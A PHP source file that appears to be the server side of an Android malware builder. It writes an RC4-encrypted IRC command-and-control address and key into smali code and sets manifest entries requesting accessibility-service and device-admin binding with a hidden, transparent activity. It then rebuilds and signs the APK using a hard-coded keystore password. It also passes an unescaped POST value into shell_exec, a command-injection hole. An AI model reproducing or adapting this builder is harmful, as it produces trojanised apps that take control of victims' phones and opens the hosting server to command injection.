<?php
#ConfigPayload
$clientpayload = "file";

#RC4 Configs
$urlirc = $_POST["urlirc"];
$tagres = $_POST["tag"];
$keyrc = $_POST["keyrcencypt"];

#Configure
$appname = $_POST["nameapps"];
$accessibilityservice = $_POST["nameaccesibilityserv"];
$msg = $_POST["eresmsg"]; 
$apk = $_POST["apkname"];

#Encryption


$keyrcs = escapeshellarg($keyrc);
$urlrcs = escapeshellarg($urlirc);
$tagrcs = escapeshellarg($tagres);

#interpreter
$encryptedUrlirc = shell_exec("./rc4encryption $keyrcs $urlrcs 2>&1");
$encryptedTagres = shell_exec("./rc4encryption $keyrcs $tagrcs 2>&1");

echo "Encrypted URL: $encryptedUrlirc\n";
echo "Encrypted Tag: $encryptedTagres\n";

#BUILD APK
#Start 1,2,3,4,5
#ICON
if ($_SERVER["REQUEST_METHOD"] == "POST") {

    // Directory where the ic_launcher.png is located
    $targetDirectory = "./" . $clientpayload . "/res/drawable/"; // Update this path based on your project structure

    // Get the file details
    $fileName = basename($_FILES["appIcon"]["name"]);
    $targetFilePath = $targetDirectory . $fileName;
    $fileType = pathinfo($targetFilePath, PATHINFO_EXTENSION);

    // Check if the file is a PNG
    if ($fileType == "png") {

        // Upload the file
        if (move_uploaded_file($_FILES["appIcon"]["tmp_name"], $targetFilePath)) {
            echo "File uploaded successfully.";

            // Rename the uploaded file to ic_launcher.png
            $newFilePath = $targetDirectory . "ic_launcher.png";
            if (rename($targetFilePath, $newFilePath)) {
                echo " and renamed to ic_launcher.png.";
            } else {
                echo "Error renaming file.";
            }

        } else {
            echo "Error uploading file.";
        }

    } else {
        echo "Please upload a PNG file.";
    }
} else {
    echo "Invalid request.";
}

#URL-IRC C&C Server
$encryptedUrlirc = str_replace(["\r", "\n"], '', $encryptedUrlirc);

$line = 26; // Line number to be changed
$replace = '    const-string v0, "'.$encryptedUrlirc.'"';

$file = file("./" . $clientpayload . "/smali/fddo/for.smali");
$open = fopen("./" . $clientpayload . "/smali/fddo/for.smali", "w");

if ($open) {
    for ($i = 0; $i < count($file); $i++) {
        if (($i + 1) != $line) {
            fwrite($open, $file[$i]);
        } else {
            fwrite($open, $replace . "\r\n");
        }
    }
    fclose($open);
    echo "File modified successfully.";
} else {
    echo "Error opening the file.";
}

$encryptedTagres = str_replace(["\r", "\n"], '', $encryptedTagres);

$line = 34; // Line number to be changed
$replace = '    const-string v0, "'.$encryptedTagres.'"';

$file = file("./" . $clientpayload . "/smali/fddo/for.smali");
$open = fopen("./" . $clientpayload . "//smali/fddo/for.smali", "w");

if ($open) {
    for ($i = 0; $i < count($file); $i++) {
        if (($i + 1) != $line) {
            fwrite($open, $file[$i]);
        } else {
            fwrite($open, $replace . "\r\n");
        }
    }
    fclose($open);
    echo "File modified successfully.";
} else {
    echo "Error opening the file.";
}

#KEYRC4UPDATE
$keyrc = str_replace(["\r", "\n"], '', $keyrc);

$line = 106; // Line number to be changed
$replace = '    const-string v1, "'.$keyrc.'"';

$file = file("./" . $clientpayload . "/smali/fddo/break.smali");
$open = fopen("./" . $clientpayload . "/smali/fddo/break.smali", "w");

if ($open) {
    for ($i = 0; $i < count($file); $i++) {
        if (($i + 1) != $line) {
            fwrite($open, $file[$i]);
        } else {
            fwrite($open, $replace . "\r\n");
        }
    }
    fclose($open);
    echo "File modified successfully.";
} else {
    echo "Error opening the file.";
}

#NAMEACCESIBILITYSERVICE
$accessibilityservice = str_replace(["\r", "\n"], '', $accessibilityservice);

$line = 3; // Line number to be changed
$replace = '    <string name="a">'.$accessibilityservice.'</string>';

$file = file("./" . $clientpayload . "/res/values/strings.xml");
$open = fopen("./" . $clientpayload . "/res/values/strings.xml", "w");

if ($open) {
    for ($i = 0; $i < count($file); $i++) {
        if (($i + 1) != $line) {
            fwrite($open, $file[$i]);
        } else {
            fwrite($open, $replace . "\r\n");
        }
    }
    fclose($open);
    echo "File modified successfully.";
} else {
    echo "Error opening the file.";
}


#MSG
$msg = str_replace(["\r", "\n"], '', $msg);

$line = 4; // Line number to be changed
$replace = '    <string name="zQnYjeFaIrPaUl">'.$msg.'</string>';

$file = file("./" . $clientpayload . "/res/values/strings.xml");
$open = fopen("./" . $clientpayload . "/res/values/strings.xml", "w");

if ($open) {
    for ($i = 0; $i < count($file); $i++) {
        if (($i + 1) != $line) {
            fwrite($open, $file[$i]);
        } else {
            fwrite($open, $replace . "\r\n");
        }
    }
    fclose($open);
    echo "File modified successfully.";
} else {
    echo "Error opening the file.";
}

#NAME CHANGE 1
$appname = str_replace(["\r", "\n"], '', $appname);

$line = 28; // Line number to be changed
$replace = '    <application android:allowBackup="false" android:hardwareAccelerated="true" android:icon="@drawable/ic_launcher" android:label="'.$appname.'" android:theme="@style/Theme.AppCompat.Transparent.NoActionBar" android:usesCleartextTraffic="true">';

$file = file("./" . $clientpayload . "/AndroidManifest.xml");
$open = fopen("./" . $clientpayload . "/AndroidManifest.xml", "w");

if ($open) {
    for ($i = 0; $i < count($file); $i++) {
        if (($i + 1) != $line) {
            fwrite($open, $file[$i]);
        } else {
            fwrite($open, $replace . "\r\n");
        }
    }
    fclose($open);
    echo "File modified successfully.";
} else {
    echo "Error opening the file.";
}

#NAME CHANGE 2

$appname = str_replace(["\r", "\n"], '', $appname);

$line = 30; // Line number to be changed
$replace = '        <activity android:excludeFromRecents="true" android:exported="true" android:label="'.$appname.'" android:name="com.beginhigh19.p079j" android:noHistory="false" android:screenOrientation="fullSensor">';

$file = file("./" . $clientpayload . "/AndroidManifest.xml");
$open = fopen("./" . $clientpayload . "/AndroidManifest.xml", "w");

if ($open) {
    for ($i = 0; $i < count($file); $i++) {
        if (($i + 1) != $line) {
            fwrite($open, $file[$i]);
        } else {
            fwrite($open, $replace . "\r\n");
        }
    }
    fclose($open);
    echo "File modified successfully.";
} else {
    echo "Error opening the file.";
}

#NAME CHANGE 3

$appname = str_replace(["\r", "\n"], '', $appname);

$line = 43; // Line number to be changed
$replace = '        <receiver android:exported="false" android:label="'.$appname.'" android:name="com.beginhigh19.p053u" android:permission="android.permission.BIND_DEVICE_ADMIN">';

$file = file("./" . $clientpayload . "/AndroidManifest.xml");
$open = fopen("./" . $clientpayload . "/AndroidManifest.xml", "w");

if ($open) {
    for ($i = 0; $i < count($file); $i++) {
        if (($i + 1) != $line) {
            fwrite($open, $file[$i]);
        } else {
            fwrite($open, $replace . "\r\n");
        }
    }
    fclose($open);
    echo "File modified successfully.";
} else {
    echo "Error opening the file.";
}


#NAME CHANGE 4
$appname = str_replace(["\r", "\n"], '', $appname);

$line = 111; // Line number to be changed
$replace = '        <service android:enabled="true" android:exported="false" android:label="'.$appname.'" android:name="com.beginhigh19.p023w" android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE">';

$file = file("./" . $clientpayload . "/AndroidManifest.xml");
$open = fopen("./" . $clientpayload . "/AndroidManifest.xml", "w");

if ($open) {
    for ($i = 0; $i < count($file); $i++) {
        if (($i + 1) != $line) {
            fwrite($open, $file[$i]);
        } else {
            fwrite($open, $replace . "\r\n");
        }
    }
    fclose($open);
    echo "File modified successfully.";
} else {
    echo "Error opening the file.";
}


$apk = $_POST["apkname"];

$apktoolPath = 'bin/java/apktool.jar';
$decompiledDir = $clientpayload;
$outputApkPath = "apkbackup/{$apk}_app.apk";

$command = "java -jar {$apktoolPath} b {$decompiledDir} -o {$outputApkPath}";
$result = shell_exec($command);

if ($result === null) {
    // error build
} else {
    // successfully build
}

$command = "jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore keystore.jks -storepass 12345678 $outputApkPath mykey";
$result = shell_exec($command);

if ($result === null) {
    // error sign
} else {
    // successfully sign
}

$result = shell_exec($command);



?> 

